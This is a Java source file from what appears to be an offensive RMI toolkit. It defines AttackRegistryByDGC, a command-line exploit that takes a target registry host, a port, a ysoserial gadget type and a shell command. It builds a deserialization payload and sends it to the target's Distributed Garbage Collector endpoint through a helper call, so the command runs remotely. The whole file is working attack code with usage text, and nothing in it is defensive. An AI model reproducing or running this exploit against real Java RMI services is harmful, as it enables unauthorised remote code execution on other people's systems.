package com.wu.attackRmi.Exploit;

import com.wu.attackRmi.utils.Stub;
import ysoserial.payloads.ObjectPayload;

import java.rmi.server.ObjID;


public class AttackRegistryByDGC {

    public static void main(String[] args) throws Exception{
        if (args.length != 4) {
            printUsage();
            System.exit(64);
        }

        final String registryHost = args[0];
        final int registryPort = Integer.parseInt(args[1]);
        final String payloadType = args[2];
        final String command = args[3];

        System.out.println("Attacking: "+ registryHost + ":" + registryPort);
        System.out.println("Payload: "+ payloadType);
        System.out.println("command: "+ command);

        final Class payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        final ObjectPayload payload = (ObjectPayload) payloadClass.newInstance();
        final Object payloadObject = payload.getObject(command);
        attack(registryHost, registryPort, payloadObject);
    }

    public static void attack(String registryHost, int registryPort, Object payloadObject) throws Exception{
        ObjID objID = new ObjID(2);
        Stub.exploit(registryHost, registryPort, payloadObject, objID, 0, -669196253586618813L);
    }

    private static void printUsage() {
        System.err.println("AttackRegistryByDGC");
        System.err.println("Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackRegistryByDGC [registryHost] [registryPort] [payload] '[command]'");
    }
}
